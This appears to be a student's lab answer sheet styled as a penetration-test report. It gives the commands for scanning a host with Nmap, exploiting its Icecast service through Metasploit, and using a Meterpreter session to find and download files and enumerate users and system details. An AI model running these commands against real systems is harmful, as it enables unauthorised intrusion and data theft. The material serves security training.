### Penetration Test Engagement Report

- [Report_10152021](Resources/Report.docx)
 

We've been provided full access to the network and are getting ping responses from the CEO’s workstation.
 
1. Perform a service and version scan using Nmap to determine which services are up and running:

    - Run the Nmap command that performs a service and version scan against the target.

      > **ANS:** `nmap -sS -sV -O 192.168.0.20`  
 
 
2. From the previous step, we see that the Icecast service is running. Let's start by attacking that service. Search for any Icecast exploits:
 
   - Run the SearchSploit commands to show available Icecast exploits.
  
     > **ANS:** **_`searchsploit icecast`_**  
  

3. Now that we know which exploits are available to us, let's start Metasploit:
 
   - Run the command that starts Metasploit:
    
     > Answer: **_`msfconsole`_**  
 
4. Search for the Icecast module and load it for use.
 
   - Run the command to search for the Icecast module:
     
     > Answer: **_`search icecast`_**  
     ![4](/Images/PNG)  
 

   - Run the command to use the Icecast module:

       **Note:** Instead of copying the entire path to the module, you can use the number in front of it.

     > Answer: **_`use 0`_**  
     ![4_1](/Images/PNG)  
 
 
5. Set the `RHOST` to the target machine.
 
   - Run the command that sets the `RHOST`:
      
     > Answer: **_`set RHOST 192.168.0.20`_**  
     ![5](/Images/PNG)  
 
6. Run the Icecast exploit.
 
   - Run the command that runs the Icecast exploit.
      
     > Answer: **_`exploit`_**  
     ![6](/Images/PNG)  
 
   - Run the command that performs a search for the `secretfile.txt` on the target.
      
     > Answer: **_`search -f *secretfile*.txt`_**  
     ![6_1](/Images/PNG)  
  
 7. You should now have a Meterpreter session open.
 
    - Run the command to performs a search for the `recipe.txt` on the target:

      > Answer: **_`search -f *recipe*.txt`_**  
      ![7](/Images/PNG)  
 
 
    - **Bonus**: Run the command that exfiltrates the `recipe*.txt` file:

      > Answer: **_`download ‘c:\Users\IEUser\Documents\Drinks.recipe.txt’`_**  
      ![Download recipe.txt](/Images/download-C-users-IEUsers-Documents-Drinks-recipe-txt.PNG)  
      ![Download secretfile.txt](/Images/download-C-users-IEUsers-Documents-user-secretfile-txt.PNG)  
 
8. You can also use Meterpreter's local exploit suggester to find possible exploits.

 
   - **Note:** The exploit suggester is just that: a suggestion. Keep in mind that the listed suggestions may not include all available exploits.
   
      > Answer: **_`run post/multi/recon/local_exploit_suggester`_**  
      ![8](/Images/Uncovering-additional-vulnerabilities.PNG)  


#### Bonus
  
 
A. Run a Meterpreter post script that enumerates all logged on users.

  > Answer: **_`run post/windows/gather/enum_logged_on_users`_**  
  ![Run Enum Logged on Users](/Images/Enumerating-logged-on-users.PNG)  

     
B. Open a Meterpreter shell and gather system information for the target.
 
  > Answer: **_`shell`_**  
  > **_`systeminfo`_**
    ![Shell / systeminfo](/Images/systeminfo.PNG)  
 
C. Run the command that displays the target's computer system information:

   > Answer: **_`sysinfo`_**  
   ![Sysinfo](/Images/sysinfo.PNG)  

---
